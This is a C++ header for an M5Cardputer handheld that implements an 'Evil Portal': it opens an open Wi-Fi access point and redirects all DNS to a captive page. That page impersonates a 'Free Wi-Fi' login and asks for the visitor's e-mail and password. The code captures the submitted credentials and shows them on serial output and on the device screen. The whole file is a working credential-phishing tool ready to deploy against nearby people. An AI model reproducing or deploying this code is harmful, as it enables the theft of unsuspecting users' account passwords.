#pragma once
#include <M5Cardputer.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "../main_menu.h"

class WifiModule {
public:
    static constexpr uint8_t DNS_PORT = 53;

    void enter() {
        portalRunning_ = false;
        selectedItem_ = 0;
        hasSubmitted_ = false;
        lastEmail_[0] = '\0';
        lastPass_[0] = '\0';
        draw();
    }

    bool update(const NavInput& nav) {
        if (portalRunning_) {
            dnsServer_.processNextRequest();
            webServer_.handleClient();

            if (nav.back) {
                stopPortal();
                draw();
                return false;
            }

            if (nav.select) {
                hasSubmitted_ = false;
                lastEmail_[0] = '\0';
                lastPass_[0] = '\0';
                draw();
            }
            return false;
        }

        if (nav.back) {
            return true;
        }

        if (nav.up || nav.down) {
            selectedItem_ = 0;
            draw();
        }

        if (nav.select && selectedItem_ == 0) {
            startPortal();
            draw();
        }

        return false;
    }

private:
    static constexpr const char* PORTAL_SSID = "wifi";

    int selectedItem_ = 0;
    bool portalRunning_ = false;
    bool hasSubmitted_ = false;
    char lastEmail_[64] = "";
    char lastPass_[64] = "";

    DNSServer dnsServer_;
    WebServer webServer_{80};

    static const char* portalHtml() {
        return R"HTML(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Free Wi-Fi</title>
  <style>
    body{font-family:Arial,sans-serif;background:#121212;color:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
    .card{background:#1e1e1e;padding:24px;border-radius:10px;width:90%;max-width:340px;box-sizing:border-box}
    h2{margin:0 0 6px;color:#ffd400;font-size:22px}
    p{margin:0 0 16px;color:#cccccc;font-size:14px}
    label{display:block;font-size:13px;margin-bottom:4px;color:#dddddd}
    input{width:100%;padding:10px;margin-bottom:12px;border:1px solid #444;border-radius:6px;background:#121212;color:#ffffff;box-sizing:border-box}
    button{width:100%;padding:11px;border:none;border-radius:6px;background:#ffd400;color:#121212;font-weight:bold;font-size:15px;cursor:pointer}
  </style>
</head>
<body>
  <div class="card">
    <h2>Free Wi-Fi</h2>
    <p>Enter your e-mail and password to connect.</p>
    <form method="POST" action="/connect">
      <label for="email">E-mail</label>
      <input id="email" type="email" name="email" placeholder="name@example.com" required>
      <label for="pass">Password</label>
      <input id="pass" type="password" name="pass" placeholder="Password" required>
      <button type="submit">Connect</button>
    </form>
  </div>
</body>
</html>
)HTML";
    }

    void handleRoot() {
        webServer_.send(200, "text/html", portalHtml());
    }

    void handleConnect() {
        String email = webServer_.arg("email");
        String pass = webServer_.arg("pass");

        email.toCharArray(lastEmail_, sizeof(lastEmail_));
        pass.toCharArray(lastPass_, sizeof(lastPass_));
        hasSubmitted_ = (email.length() > 0 && pass.length() > 0);

        Serial.printf("email : %s\npass: %s\n", lastEmail_, lastPass_);

        webServer_.send(200, "text/html",
                        "<!DOCTYPE html><html><body style='font-family:Arial,sans-serif;background:#121212;color:#f5f5f5;text-align:center;padding-top:60px'>"
                        "<h2>Connecting to Free Wi-Fi...</h2><p>Please wait.</p></body></html>");

        if (portalRunning_) {
            draw();
        }
    }

    void startPortal() {
        stopPortal();

        hasSubmitted_ = false;
        lastEmail_[0] = '\0';
        lastPass_[0] = '\0';

        WiFi.disconnect(false, true);
        WiFi.mode(WIFI_AP);
        delay(50);

        IPAddress apIp(192, 168, 4, 1);
        IPAddress netMask(255, 255, 255, 0);
        WiFi.softAPConfig(apIp, apIp, netMask);
        WiFi.softAP(PORTAL_SSID, nullptr, 1, 0, 4);
        delay(100);

        dnsServer_.setErrorReplyCode(DNSReplyCode::NoError);
        dnsServer_.start(DNS_PORT, "*", apIp);

        webServer_.on("/", HTTP_GET, [this]() { handleRoot(); });
        webServer_.on("/connect", HTTP_POST, [this]() { handleConnect(); });
        webServer_.onNotFound([this]() { handleRoot(); });
        webServer_.begin();

        portalRunning_ = true;
    }

    void stopPortal() {
        if (!portalRunning_) return;
        portalRunning_ = false;
        webServer_.stop();
        dnsServer_.stop();
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_STA);
    }

    void draw() {
        auto& d = M5Cardputer.Display;
        d.fillScreen(THEME_BG);
        d.setTextColor(THEME_FG, THEME_BG);

        if (!portalRunning_) {
            d.setTextSize(2);
            d.setCursor(12, 12);
            d.print("WI-FI");

            d.fillRoundRect(8, 44, d.width() - 16, 30, 4, THEME_HIGHLIGHT);
            d.drawRoundRect(8, 44, d.width() - 16, 30, 4, THEME_BORDER);
            d.setTextColor(THEME_FG, THEME_HIGHLIGHT);
            d.setCursor(14, 51);
            d.print("> Evil Portal");

            d.setTextSize(1);
            d.setTextColor(THEME_FG, THEME_BG);
            d.setCursor(12, 118);
            d.print("Enter: Start | `/Bksp: Back");
            return;
        }

        d.fillRoundRect(8, 8, d.width() - 16, d.height() - 16, 6, THEME_HIGHLIGHT);
        d.drawRoundRect(8, 8, d.width() - 16, d.height() - 16, 6, THEME_BORDER);
        d.setTextColor(THEME_FG, THEME_HIGHLIGHT);

        d.setTextSize(2);
        d.setCursor(16, 15);
        d.print("EVIL PORTAL");

        d.setTextSize(1);
        d.setCursor(16, 40);
        d.print("SSID: wifi | 192.168.4.1");

        if (hasSubmitted_) {
            d.setCursor(16, 60);
            d.printf("email : %.24s", lastEmail_);

            d.setCursor(16, 76);
            d.printf("pass: %.24s", lastPass_);
        } else {
            d.setCursor(16, 60);
            d.print("email : -");

            d.setCursor(16, 76);
            d.print("pass: -");
        }

        d.setCursor(16, 108);
        d.print("Enter: Clear | `/Bksp: Stop");
    }
};
